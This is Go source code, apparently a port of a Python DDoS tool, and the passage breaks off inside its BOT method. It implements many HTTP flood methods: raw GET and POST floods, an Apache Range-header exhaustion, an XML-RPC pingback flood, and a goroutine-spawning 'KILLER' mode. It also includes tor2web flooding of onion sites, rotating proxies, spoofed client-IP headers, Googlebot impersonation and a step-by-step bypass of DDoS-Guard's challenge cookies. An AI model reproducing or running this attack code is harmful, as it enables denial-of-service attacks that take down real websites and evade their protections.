	checkJSURL := "https://check.ddos-guard.net/check.js"
	req, _ = http.NewRequest("POST", checkJSURL, nil) // POST in Python
	req.Header = make(http.Header)
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Referer", targetURL.String())
	req.Header.Set("Sec-Fetch-Dest", "script")
	req.Header.Set("Sec-Fetch-Mode", "no-cors")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Connection", "keep-alive")

	resp, err = client.Do(req)
	checkJSURLParsed, _ := url.Parse(checkJSURL)
	if err != nil {
		logDebugf("[Thread %d] DGB Solver: POST to check.js failed: %v", threadID, err)
		// Don't fail here, maybe the next step works anyway
	} else {
		logDebugf("[Thread %d] DGB Solver: POST to check.js status: %s, Cookies: %v", threadID, resp.Status, client.Jar.Cookies(checkJSURLParsed))
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}

	// Find __ddg2 cookie
	cookies := client.Jar.Cookies(checkJSURLParsed) // Check cookies for check.js domain
	var ddg2Value string
	for _, c := range cookies {
		if c.Name == "__ddg2" {
			ddg2Value = c.Value
			logDebugf("[Thread %d] DGB Solver: Found __ddg2 cookie: %s", threadID, ddg2Value)
			break
		}
	}
	if ddg2Value == "" {
		// Also check cookies for the original target domain, sometimes it's set there
		cookies = client.Jar.Cookies(targetURL)
		for _, c := range cookies {
			if c.Name == "__ddg2" {
				ddg2Value = c.Value
				logDebugf("[Thread %d] DGB Solver: Found __ddg2 cookie (on target domain): %s", threadID, ddg2Value)
				break
			}
		}
	}

	if ddg2Value == "" {
		logDebugf("[Thread %d] DGB Solver: Did not get __ddg2 cookie. Proceeding without well-known check.", threadID)
		// Return current client/jar state, might be enough for some scenarios
		return client, jar
	}

	// 3. GET request to .well-known/ddos-guard/id/
	logDebugf("[Thread %d] DGB Solver: Step 3 - GET to .well-known/ddos-guard/id/%s", threadID, ddg2Value)
	wellKnownURLStr := fmt.Sprintf("%s://%s/.well-known/ddos-guard/id/%s", targetURL.Scheme, targetURL.Host, ddg2Value)
	req, _ = http.NewRequest("GET", wellKnownURLStr, nil)
	req.Header = make(http.Header)
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "image/webp,*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", targetURL.String())
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "no-cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin") // Should be same-origin relative to targetURL
	req.Header.Set("Connection", "keep-alive")

	resp, err = client.Do(req)
	wellKnownURLParsed, _ := url.Parse(wellKnownURLStr)
	if err != nil {
		logDebugf("[Thread %d] DGB Solver: GET to .well-known failed: %v", threadID, err)
		// Return current state, maybe previous steps were enough
	} else {
		logDebugf("[Thread %d] DGB Solver: GET to .well-known status: %s, Cookies: %v", threadID, resp.Status, client.Jar.Cookies(wellKnownURLParsed))
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}

	logDebugf("[Thread %d] DGB Solver: Finished.", threadID)
	// Return the client and jar, hoping it acquired necessary cookies.
	return client, jar
}

// --- HttpFlood Task ---
type HttpFlood struct {
	threadID       int
	target         *url.URL // Parsed URL
	host           string   // Original Host or Resolved IP (based on method)
	method         string   // Attack method (e.g., GET, POST)
	rpc            int      // Requests per connection / concurrency factor
	ctx            context.Context // Main context for cancellation
	cancel         context.CancelFunc // Function to cancel this specific flood task if needed (e.g., KILLER sub-task)
	wg             *sync.WaitGroup    // WaitGroup from main
	useragents     []string
	referers       []string
	proxies        []*Proxy
	cookie         string // Optional cookie string
	rawTarget      string // host:port string for net.Dial
	reqType        string // GET, POST, HEAD
	tlsConfig      *tls.Config
	httpClient     *http.Client // Shared client for methods like BYPASS/CFB (recreated if proxy needed per request)
	bombardierPath string       // Path for BOMB method

	// Reusable buffer for generating payloads
	payloadBuf bytes.Buffer
}

// NewHttpFlood creates a new HttpFlood instance.
func NewHttpFlood(threadID int, target *url.URL, host string, method string, rpc int, mainCtx context.Context, wg *sync.WaitGroup, useragents, referers []string, proxies []*Proxy, cookie string, bombardierPath string) *HttpFlood {
	ctx, cancel := context.WithCancel(mainCtx) // Create cancellable context for this flood instance

	port := target.Port()
	if port == "" {
		if target.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	// Use resolved IP (host arg) for rawTarget connection, unless method is TOR
	rawTargetHost := host
	if method == "TOR" {
		rawTargetHost = target.Hostname() // Use .onion address for TOR connection logic
	}
	rawTarget := net.JoinHostPort(rawTargetHost, port)

	// Determine request type (GET, POST, HEAD)
	reqType := getMethodType(method)

	// TLS config (mimics Python's ctx)
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // ctx.check_hostname = False, ctx.verify_mode = CERT_NONE
		ServerName:         target.Hostname(), // For SNI, may be overridden in openConnection
		MinVersion:         tls.VersionTLS12,  // Reasonable default
	}

	// Shared HTTP Client Setup (used by CFB, BYPASS, DGB where appropriate)
	// We create a base transport and client here. Methods requiring specific proxy handling
	// per request might create temporary clients or modify the transport.
	baseTransport := &http.Transport{
		TLSClientConfig: tlsConfig,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second, // Connection timeout
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          100, // Allow ample idle connections globally
		MaxIdleConnsPerHost:   100, // Allow many per host
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second, // TLS handshake timeout
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:     true, // Try HTTP/2
		// Proxy set per-request or in temporary clients if needed
	}
	baseHttpClient := &http.Client{
		Transport: baseTransport,
		Timeout:   20 * time.Second, // General request timeout
		Jar:       nil,              // No shared jar by default
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Default: Follow redirects up to 10 times
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	h := &HttpFlood{
		threadID:       threadID,
		target:         target,
		host:           host, // Can be IP or domain name
		method:         method,
		rpc:            rpc,
		ctx:            ctx,
		cancel:         cancel, // Store the cancel func
		wg:             wg,
		useragents:     useragents,
		referers:       referers,
		proxies:        proxies,
		cookie:         cookie,
		rawTarget:      rawTarget,
		reqType:        reqType,
		tlsConfig:      tlsConfig,
		httpClient:     baseHttpClient, // Assign the base client
		bombardierPath: bombardierPath,
	}
	logDebugf("[Thread %d] Initialized Flood: Method=%s, Target=%s, RPC=%d, Proxies=%d",
		h.threadID, h.method, h.target.String(), h.rpc, len(h.proxies))
	return h
}

// getMethodType determines the HTTP method verb (GET, POST, HEAD).
func getMethodType(method string) string {
	methodUpper := strings.ToUpper(method)
	switch methodUpper {
	case "POST", "XMLRPC", "STRESS":
		return "POST"
	case "HEAD", "GSB": // GSB uses HEAD
		return "HEAD"
	default: // Includes GET and all others handled by raw sockets or specialized logic
		return "GET"
	}
}

// randHeaderContent generates User-Agent, Referer, and SpoofIP headers.
func (h *HttpFlood) randHeaderContent() string {
	ua := randChoice(h.useragents)
	ref := randChoice(h.referers)
	// Use target.String() which includes scheme, host, path, query. Python used human_repr().
	refererURL := ref + url.QueryEscape(h.target.String())

	// Generate a plausible private IP or loopback for SpoofIP, less likely to be filtered than fully random public IPs.
	// Example: Choose between 10.x.x.x, 192.168.x.x, 172.16-31.x.x, 127.0.0.1
	spoofIP := ""
	switch mrand.Intn(4) {
	case 0: // 10.0.0.0/8
		spoofIP = fmt.Sprintf("10.%d.%d.%d", mrand.Intn(256), mrand.Intn(256), mrand.Intn(256))
	case 1: // 192.168.0.0/16
		spoofIP = fmt.Sprintf("192.168.%d.%d", mrand.Intn(256), mrand.Intn(256))
	case 2: // 172.16.0.0/12
		spoofIP = fmt.Sprintf("172.%d.%d.%d", randInt(16, 31), mrand.Intn(256), mrand.Intn(256))
	case 3: // Loopback
		spoofIP = "127.0.0.1"
	}

	// Ensure Referer spelling is correct
	return fmt.Sprintf("User-Agent: %s\r\nReferer: %s\r\nClient-IP: %s\r\n", ua, refererURL, spoofIP)
}

// generatePayload creates the raw HTTP request string/bytes.
func (h *HttpFlood) generatePayload(otherHeaders string, body []byte) []byte {
	h.payloadBuf.Reset() // Reuse buffer

	// Request Line
	// Use target.RequestURI() which gives path + '?' + query
	requestURI := h.target.RequestURI()
	if requestURI == "" {
		requestURI = "/" // Ensure path is at least "/"
	}
	h.payloadBuf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", h.reqType, requestURI))

	// Header generation
	acceptEncoding := randChoice(acceptEncodingValues)
	acceptLanguage := randChoice(acceptLanguageValues)
	cacheControl := randChoice(cacheControlValues)
	connection := randChoice(connectionValues) // Use randomized connection header

	// Base headers map (adapt based on Python's generate_payload logic)
	headersMap := map[string]string{
		"Accept-Encoding":           acceptEncoding,
		"Accept-Language":           acceptLanguage,
		"Cache-Control":             cacheControl,
		"Connection":                connection,
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
		"Sec-GPC":                   "1", // From Python analysis
		"Pragma":                    "no-cache", // From Python analysis
		"Upgrade-Insecure-Requests": "1",
		"Host":                      h.target.Host, // Use target.Host which includes port if non-default
	}

	// Convert map to slice for shuffling
	shuffledHeaders := make([]string, 0, len(headersMap))
	for k, v := range headersMap {
		if v != "" { // Only add headers with non-empty values
			shuffledHeaders = append(shuffledHeaders, fmt.Sprintf("%s: %s", k, v))
		}
	}
	mrand.Shuffle(len(shuffledHeaders), func(i, j int) {
		shuffledHeaders[i], shuffledHeaders[j] = shuffledHeaders[j], shuffledHeaders[i]
	})

	// Write shuffled headers
	for _, header := range shuffledHeaders {
		h.payloadBuf.WriteString(header + "\r\n")
	}

	// Write UA, Referer, SpoofIP (append these after shuffling others)
	h.payloadBuf.WriteString(h.randHeaderContent())

	// Add Cookie if present
	if h.cookie != "" {
		h.payloadBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", h.cookie))
	}

	// Add other specific headers passed in `otherHeaders`
	if otherHeaders != "" {
		trimmedOther := strings.TrimSpace(otherHeaders)
		if trimmedOther != "" {
			// Ensure otherHeaders ends with \r\n
			lines := strings.Split(trimmedOther, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" {
					h.payloadBuf.WriteString(line + "\r\n")
				}
			}
		}
	}

	// Add Content-Length if body exists AND method is POST/PUT etc.
	// Body presence alone isn't enough, method matters.
	if len(body) > 0 && (h.reqType == "POST" || h.reqType == "PUT") {
		h.payloadBuf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
	}

	// End of headers
	h.payloadBuf.WriteString("\r\n")

	// Append body bytes if present
	if len(body) > 0 {
		h.payloadBuf.Write(body)
	}

	// Return bytes from the buffer
	// Make a copy to avoid buffer reuse issues if caller holds onto the slice
	payloadBytes := make([]byte, h.payloadBuf.Len())
	copy(payloadBytes, h.payloadBuf.Bytes())

	// Log payload in debug mode (careful with large bodies)
	if *debugFlag {
		logPayload := string(payloadBytes)
		maxLogLen := 512
		if len(logPayload) > maxLogLen {
			logPayload = logPayload[:maxLogLen] + "... (truncated)"
		}
		logDebugf("[Thread %d] Generated Payload:\n---\n%s\n---", h.threadID, logPayload)
	}

	return payloadBytes
}

// openConnection establishes a connection (direct or proxied) and wraps with TLS if needed.
func (h *HttpFlood) openConnection(hostOverride string, portOverride string) (net.Conn, error) {
	var conn net.Conn
	var err error
	connectTimeout := 10 * time.Second // Increased timeout

	targetAddr := h.rawTarget           // Default target (resolved IP/host:port from init)
	targetHostname := h.target.Hostname() // Original hostname for SNI

	if hostOverride != "" {
		port := portOverride
		if port == "" {
			port = h.target.Port() // Use original port if override is missing
			if port == "" {
				port = "80" // Default to 80 if still missing (HTTP assumed)
				if h.target.Scheme == "https" {
					port = "443"
				}
			}
		}
		targetAddr = net.JoinHostPort(hostOverride, port)
		targetHostname = hostOverride // Use override for SNI as well if host is overridden
		logDebugf("[Thread %d] Overriding connection target to %s, SNI target to %s", h.threadID, targetAddr, targetHostname)
	}

	if len(h.proxies) > 0 {
		// Select random proxy
		proxy := h.proxies[mrand.Intn(len(h.proxies))]
		logDebugf("[Thread %d] Attempting connection to %s via proxy %s (%s)", h.threadID, targetAddr, proxy.Original, proxy.Type)
		conn, err = proxy.openSocket("tcp", targetAddr, h.threadID, connectTimeout)
		if err != nil {
			// Error already logged in openSocket if debug enabled
			return nil, fmt.Errorf("proxy connection via %s failed: %w", proxy.Original, err)
		}
		logDebugf("[Thread %d] Connection established to %s via proxy %s", h.threadID, targetAddr, proxy.Original)
	} else {
		// Direct connection
		logDebugf("[Thread %d] Attempting direct connection to %s", h.threadID, targetAddr)
		dialer := net.Dialer{Timeout: connectTimeout}
		conn, err = dialer.DialContext(h.ctx, "tcp", targetAddr)
		if err != nil {
			logDebugf("[Thread %d] Direct connection to %s failed: %v", h.threadID, targetAddr, err)
			return nil, fmt.Errorf("direct connection to %s failed: %w", targetAddr, err)
		}
		logDebugf("[Thread %d] Direct connection established to %s", h.threadID, targetAddr)
	}

	// Set TCP_NODELAY (useful for some attack types)
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		if err := tcpConn.SetNoDelay(true); err != nil {
			logDebugf("[Thread %d] Failed to set TCP_NODELAY: %v", h.threadID, err)
			// Continue anyway, not critical
		} else {
			logDebugf("[Thread %d] TCP_NODELAY set", h.threadID)
		}
	} else {
		// This can happen with TLS connections or proxied connections before unwrapping
		// Let's try to get the underlying TCP connection if possible for TLS
		// If it's a proxy, setting NoDelay on the proxy conn might not be what we want.
		// We should ideally set it *after* the proxy handshake if possible, but that complicates openSocket.
		// For TLS, try to get underlying conn.
		if tlsConn, ok := conn.(*tls.Conn); ok {
			if netConn := tlsConn.NetConn(); netConn != nil {
				if tcpConn, ok := netConn.(*net.TCPConn); ok {
					if err := tcpConn.SetNoDelay(true); err != nil {
						logDebugf("[Thread %d] Failed to set TCP_NODELAY on underlying TLS conn: %v", h.threadID, err)
					} else {
						logDebugf("[Thread %d] TCP_NODELAY set on underlying TLS conn", h.threadID)
					}
				} else {
					logDebugf("[Thread %d] Underlying TLS connection is not TCP, cannot set TCP_NODELAY", h.threadID)
				}
			}
		} else {
			logDebugf("[Thread %d] Connection is not TCP or TLS, cannot set TCP_NODELAY", h.threadID)
		}
	}

	// Wrap connection with TLS if target is HTTPS
	if h.target.Scheme == "https" {
		logDebugf("[Thread %d] Performing TLS handshake for %s (SNI: %s)", h.threadID, targetAddr, targetHostname)
		tlsClientConfig := h.tlsConfig.Clone() // Clone to set ServerName
		tlsClientConfig.ServerName = targetHostname // Use appropriate hostname for SNI

		tlsConn := tls.Client(conn, tlsClientConfig)

		// Set handshake timeout using context
		handshakeCtx, handshakeCancel := context.WithTimeout(h.ctx, 10*time.Second) // 10s handshake timeout
		defer handshakeCancel()
		err = tlsConn.HandshakeContext(handshakeCtx)
		if err != nil {
			safeClose(conn, h.threadID) // Close underlying connection
			logDebugf("[Thread %d] TLS handshake failed (%s, SNI: %s): %v", h.threadID, targetAddr, tlsClientConfig.ServerName, err)
			return nil, fmt.Errorf("TLS handshake failed for %s: %w", targetHostname, err)
		}
		conn = tlsConn // Use the TLS wrapped connection
		logDebugf("[Thread %d] TLS handshake successful for %s", h.threadID, targetAddr)
	}

	// Do not set generic read/write deadline here; methods will manage their own if needed.
	return conn, nil
}

// run starts the attack loop for the selected method.
func (h *HttpFlood) run() {
	defer h.wg.Done() // Signal WaitGroup when goroutine finishes
	defer h.cancel()  // Ensure instance context is cancelled on exit

	var floodFunc func()

	switch strings.ToUpper(h.method) {
	case "GET":
		floodFunc = h.GET
	case "POST":
		floodFunc = h.POST
	case "HEAD":
		floodFunc = h.GET // HEAD uses GET logic with h.reqType="HEAD"
	case "CFB":
		floodFunc = h.CFB
	case "BYPASS":
		floodFunc = h.BYPASS
	case "OVH":
		floodFunc = h.OVH
	case "STRESS":
		floodFunc = h.STRESS
	case "DYN":
		floodFunc = h.DYN
	case "SLOW":
		floodFunc = h.SLOW
	case "NULL":
		floodFunc = h.NULL
	case "COOKIE":
		floodFunc = h.COOKIES
	case "PPS":
		floodFunc = h.PPS
	case "EVEN":
		floodFunc = h.EVEN
	case "GSB":
		floodFunc = h.GSB
	case "DGB":
		floodFunc = h.DGB
	case "AVB":
		floodFunc = h.AVB
	case "CFBUAM":
		floodFunc = h.CFBUAM
	case "APACHE":
		floodFunc = h.APACHE
	case "XMLRPC":
		floodFunc = h.XMLRPC
	case "BOT":
		floodFunc = h.BOT
	case "BOMB":
		floodFunc = h.BOMB
	case "DOWNLOADER":
		floodFunc = h.DOWNLOADER
	case "KILLER":
		floodFunc = h.KILLER
	case "TOR":
		floodFunc = h.TOR
	case "RHEX":
		floodFunc = h.RHEX
	case "STOMP":
		floodFunc = h.STOMP
	default:
		// This case should not be reached due to checks in main
		logDebugf("[Thread %d] Unknown method '%s' in run(), stopping.", h.threadID, h.method)
		return
	}

	logDebugf("[Thread %d] Starting main attack loop: Method %s", h.threadID, h.method)
	// Main attack loop
	for {
		select {
		case <-h.ctx.Done(): // Check if context has been cancelled
			logDebugf("[Thread %d] Context cancelled, stopping attack loop.", h.threadID)
			return
		default:
			// Execute the selected attack method function
			// Wrap the call in a function to recover panics within the loop if needed
			func() {
				// Optional: Recover from panics within a specific floodFunc call
				// defer func() {
				// 	if r := recover(); r != nil {
				// 		logDebugf("[Thread %d] Recovered from panic in floodFunc: %v", h.threadID, r)
				// 	}
				// }()
				floodFunc()
			}()
			// Yield slightly to prevent busy-looping if floodFunc returns immediately
			// This depends on floodFunc behavior. If it's very fast and connects/disconnects,
			// a small sleep might be needed to avoid overwhelming resources.
			// time.Sleep(1 * time.Millisecond)
		}
	}
}

// --- Attack Methods ---

// sendLoop sends the payload 'count' times over the connection, respecting context cancellation.
func (h *HttpFlood) sendLoop(conn net.Conn, payload []byte, count int) bool {
	logDebugf("[Thread %d] Entering sendLoop: count=%d", h.threadID, count)
	for i := 0; i < count; i++ {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] sendLoop cancelled during iteration %d", h.threadID, i)
			return false // Stop if context is cancelled
		default:
			logDebugf("[Thread %d] sendLoop iteration %d: Sending payload", h.threadID, i+1)
			sent, err := send(conn, payload, h.threadID)
			if !sent || err != nil {
				logDebugf("[Thread %d] sendLoop failed on iteration %d: %v", h.threadID, i+1, err)
				return false // Stop if send fails
			}
		}
	}
	logDebugf("[Thread %d] sendLoop finished successfully after %d sends", h.threadID, count)
	return true
}

// --- Standard Raw Socket Methods ---

func (h *HttpFlood) GET() {
	logDebugf("[Thread %d] Executing GET method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		// Error already logged in openConnection if debug enabled
		// No need for redundant log here unless adding context
		// logDebugf("[Thread %d] GET: Failed to open connection: %v", h.threadID, err)
		return // Cannot establish connection
	}
	defer safeClose(conn, h.threadID)

	payload := h.generatePayload("", nil) // Standard GET/HEAD payload

	h.sendLoop(conn, payload, h.rpc)
}

func (h *HttpFlood) POST() {
	logDebugf("[Thread %d] Executing POST method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	payloadSize := randInt(20, 40)
	randomString := randStr(payloadSize)
	bodyData := fmt.Sprintf(`{"data": "%s"}`, randomString)
	body := []byte(bodyData)
	logDebugf("[Thread %d] POST: Generated body (size %d): %s", h.threadID, len(body), bodyData)

	headers := "Content-Type: application/json\r\n" + // Content-Length added by generatePayload
		"X-Requested-With: XMLHttpRequest\r\n"

	payload := h.generatePayload(headers, body)

	h.sendLoop(conn, payload, h.rpc)
}

func (h *HttpFlood) TOR() {
	logDebugf("[Thread %d] Executing TOR method", h.threadID)
	if !strings.HasSuffix(h.target.Hostname(), ".onion") {
		warning(fmt.Sprintf("[Thread %d] TOR method called on non-onion address (%s), falling back to standard GET.", h.threadID, h.target.Host))
		h.GET() // Fallback to GET if not .onion
		return
	}

	provider := "." + randChoice(tor2webs)
	targetHost := strings.Replace(h.target.Hostname(), ".onion", provider, 1)
	logDebugf("[Thread %d] TOR: Using tor2web provider %s, target host: %s", h.threadID, provider, targetHost)

	// Connect to the tor2web host, using it for SNI as well
	conn, err := h.openConnection(targetHost, "")
	if err != nil {
		logDebugf("[Thread %d] TOR connection to %s failed: %v", h.threadID, targetHost, err)
		return
	}
	defer safeClose(conn, h.threadID)

	// Generate payload specifically for TOR method
	payload := h.generateTorPayload(targetHost)

	h.sendLoop(conn, payload, h.rpc)
}

// generateTorPayload creates payload specifically for TOR method
func (h *HttpFlood) generateTorPayload(tor2webHost string) []byte {
	h.payloadBuf.Reset() // Reuse buffer

	// Request Line (uses original path/query)
	requestURI := h.target.RequestURI()
	if requestURI == "" {
		requestURI = "/"
	}
	h.payloadBuf.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\n", requestURI))

	// Header generation (similar to generatePayload but with specific Host)
	acceptEncoding := randChoice(acceptEncodingValues)
	acceptLanguage := randChoice(acceptLanguageValues)
	cacheControl := randChoice(cacheControlValues)
	connection := "keep-alive" // Tor2web likely benefits from keep-alive

	headersMap := map[string]string{
		"Accept-Encoding":           acceptEncoding,
		"Accept-Language":           acceptLanguage,
		"Cache-Control":             cacheControl,
		"Connection":                connection,
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none", // Request is direct to tor2web
		"Sec-Fetch-User":            "?1",
		"Upgrade-Insecure-Requests": "1",
		// Key Difference: Host header uses the ORIGINAL .onion address
		"Host": h.target.Host,
	}
	shuffledHeaders := make([]string, 0, len(headersMap))
	for k, v := range headersMap {
		if v != "" {
			shuffledHeaders = append(shuffledHeaders, fmt.Sprintf("%s: %s", k, v))
		}
	}
	mrand.Shuffle(len(shuffledHeaders), func(i, j int) {
		shuffledHeaders[i], shuffledHeaders[j] = shuffledHeaders[j], shuffledHeaders[i]
	})
	for _, header := range shuffledHeaders {
		h.payloadBuf.WriteString(header + "\r\n")
	}

	// Standard UA, Referer (pointing to original), Spoofed IP
	ua := randChoice(h.useragents)
	ref := randChoice(h.referers)
	refererURL := ref + url.QueryEscape(h.target.String()) // Referer points to original .onion URL
	spoofIP := randIPv4() // Standard spoofed IP
	h.payloadBuf.WriteString(fmt.Sprintf("User-Agent: %s\r\n", ua))
	h.payloadBuf.WriteString(fmt.Sprintf("Referer: %s\r\n", refererURL))
	h.payloadBuf.WriteString(fmt.Sprintf("Client-IP: %s\r\n", spoofIP))

	// Add Cookie if present
	if h.cookie != "" {
		h.payloadBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", h.cookie))
	}

	// End of headers
	h.payloadBuf.WriteString("\r\n")

	payloadBytes := make([]byte, h.payloadBuf.Len())
	copy(payloadBytes, h.payloadBuf.Bytes())
	if *debugFlag {
		logPayload := string(payloadBytes)
		maxLogLen := 512
		if len(logPayload) > maxLogLen {
			logPayload = logPayload[:maxLogLen] + "... (truncated)"
		}
		logDebugf("[Thread %d] TOR Generated Payload (Target Host: %s):\n---\n%s\n---", h.threadID, h.target.Host, logPayload)
	}

	return payloadBytes
}

func (h *HttpFlood) STRESS() {
	logDebugf("[Thread %d] Executing STRESS method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	bodyData := fmt.Sprintf(`{"data": "%s"}`, randStr(512))
	body := []byte(bodyData)
	logDebugf("[Thread %d] STRESS: Generated body (size %d)", h.threadID, len(body))

	headers := "Content-Type: application/json\r\n" +
		"X-Requested-With: XMLHttpRequest\r\n"

	payload := h.generatePayload(headers, body)

	h.sendLoop(conn, payload, h.rpc)
}

func (h *HttpFlood) COOKIES() {
	logDebugf("[Thread %d] Executing COOKIE method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	// Generate custom cookie string as in Python
	customCookie := fmt.Sprintf("_ga=GA%d; _gat=1; __cfduid=%s; %s=%s",
		randInt(1000, 99999), randStr(43), // Mimic __cfduid format/length better
		randStr(6), randStr(32))

	// Add the custom cookie to the existing cookie (if any) or use it standalone
	finalCookie := customCookie
	if h.cookie != "" {
		finalCookie = h.cookie + "; " + customCookie
	}
	logDebugf("[Thread %d] COOKIE: Using combined cookie: %s", h.threadID, finalCookie)

	// Store original cookie, generate payload with custom one, then restore
	originalCookie := h.cookie
	h.cookie = finalCookie // Temporarily set combined cookie
	defer func() { h.cookie = originalCookie }() // Ensure original cookie is restored

	payload := h.generatePayload("", nil) // Generate payload with combined cookie

	h.sendLoop(conn, payload, h.rpc)
}

func (h *HttpFlood) APACHE() {
	logDebugf("[Thread %d] Executing APACHE method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	// Generate the large Range header value
	var rangeBuilder strings.Builder
	rangeBuilder.WriteString("bytes=0-") // Initial part
	for i := 0; i < 1023; i++ { // Python uses 1024 total ranges (1 to 1024), Go loops 0 to 1022
		rangeBuilder.WriteString(fmt.Sprintf(",5-%d", i+1)) // Match Python's 5-1, 5-2,...
	}
	rangeHeader := fmt.Sprintf("Range: %s\r\n", rangeBuilder.String())
	logDebugf("[Thread %d] APACHE: Using Range header (first 100 chars): %s...", h.threadID, rangeHeader[:min(len(rangeHeader), 100)])

	payload := h.generatePayload(rangeHeader, nil)

	h.sendLoop(conn, payload, h.rpc)
}

func (h *HttpFlood) XMLRPC() {
	logDebugf("[Thread %d] Executing XMLRPC method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	// Generate XML body
	bodyData := fmt.Sprintf(`<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>`, randStr(64), randStr(64))
	body := []byte(bodyData)
	logDebugf("[Thread %d] XMLRPC: Generated body (size %d)", h.threadID, len(body))

	headers := "Content-Type: application/xml\r\n" +
		"X-Requested-With: XMLHttpRequest\r\n"

	payload := h.generatePayload(headers, body)

	h.sendLoop(conn, payload, h.rpc)
}

func (h *HttpFlood) PPS() {
	logDebugf("[Thread %d] Executing PPS method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	// Minimal payload for PPS flooding
	ua := randChoice(h.useragents)
	requestURI := h.target.RequestURI()
	if requestURI == "" {
		requestURI = "/"
	}
	payloadStr := fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nUser-Agent: %s\r\n\r\n",
		h.reqType, requestURI, h.target.Host, ua)
	payloadBytes := []byte(payloadStr)
	logDebugf("[Thread %d] PPS: Using minimal payload:\n%s", h.threadID, payloadStr)

	h.sendLoop(conn, payloadBytes, h.rpc)
}

func (h *HttpFlood) KILLER() {
	logDebugf("[Thread %d] Executing KILLER method (Warning: Spawns unbounded goroutines)", h.threadID)
	// Replicates Python's behavior of spawning new threads (goroutines) indefinitely.
	for {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] KILLER: Context cancelled, stopping spawning.", h.threadID)
			return // Stop spawning if context is cancelled
		default:
			// Launch a new GET flood goroutine.
			// It inherits the main context via h.ctx, so it will stop eventually.
			// We need to manage the WaitGroup correctly.
			h.wg.Add(1) // Increment WaitGroup for the new goroutine
			go func() {
				// Decrement WaitGroup when the sub-goroutine finishes
				// Also need to handle potential panics within the sub-goroutine
				defer func() {
					if r := recover(); r != nil {
						logDebugf("[Thread %d] KILLER sub-goroutine panicked: %v", h.threadID, r)
					}
					h.wg.Done()
				}()

				// Create a sub-context that can be cancelled independently if needed,
				// but still linked to the parent context (h.ctx).
				// Using h.ctx directly is usually sufficient.
				logDebugf("[Thread %d] KILLER: Spawning sub-goroutine for GET flood", h.threadID)
				h.GET() // Run a single GET attack cycle in the new goroutine
				logDebugf("[Thread %d] KILLER: Sub-goroutine finished GET flood", h.threadID)
			}()
			// Small delay to prevent overwhelming the system instantly
			time.Sleep(10 * time.Millisecond) // Same delay as Python
		}
	}
}

func (h *HttpFlood) BOT() {
	logDebugf("[Thread %d] Executing BOT method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	// Prepare bot-like initial requests
	googleUA := randChoice(googleAgents)
	commonBotHeaders := fmt.Sprintf("Host: %s\r\nConnection: Keep-Alive\r\nUser-Agent: %s\r\nAccept-Encoding: gzip,deflate,br\r\n",
		h.target.Host, googleUA)

	p1Str := fmt.Sprintf("GET /robots.txt HTTP/1.1\r\n%sAccept: text/plain,text/html,*/*\r\n\r\n", commonBotHeaders)
	p2Str := fmt.Sprintf("GET /sitemap.xml HTTP/1.1\r\n%sAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nIf-None-Match: \"%s-%s\"\r\nIf-Modified-Since: Sun, 26 Sep 2099 06:00:00 GMT\r\n\r\n",
		commonBotHeaders, randStr(9), randStr(4))

	logDebugf("[Thread %d] BOT: Sending robots.txt request:\n%s", h.threadID, p1Str)
	sent, err := send(conn, []byte(p1Str), h.threadID)
	if !sent {
		logDebugf("[Thread %d] BOT: Failed sending robots.txt request: %v", h.threadID, err)
		return // Stop if send fails
	}

	logDebugf("[Thread %d] BOT: Sending sitemap.xml request:\n%s", h.threadID, p2Str)
	sent, err = send(conn, []byte(p2Str), h.threadID)
